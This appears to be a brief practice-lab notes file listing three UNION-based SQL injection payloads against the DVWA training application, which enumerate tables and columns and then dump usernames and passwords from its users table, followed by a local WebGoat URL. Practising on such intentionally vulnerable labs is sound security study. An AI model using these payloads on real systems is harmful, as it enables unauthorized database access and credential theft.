```mysql
// sql injection
2' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='dvwa' #'

2' UNION SELECT column_name, column_type FROM information_schema.columns WHERE  table_schema='dvwa' AND table_name='users' #'

3' UNION SELECT CONCAT (user_id, `- `, first_name , `- `,  last_name), CONCAT (user , `-- `, password) FROM dvwa.users #'
```



http://10.10.10.12:8000/WebGoat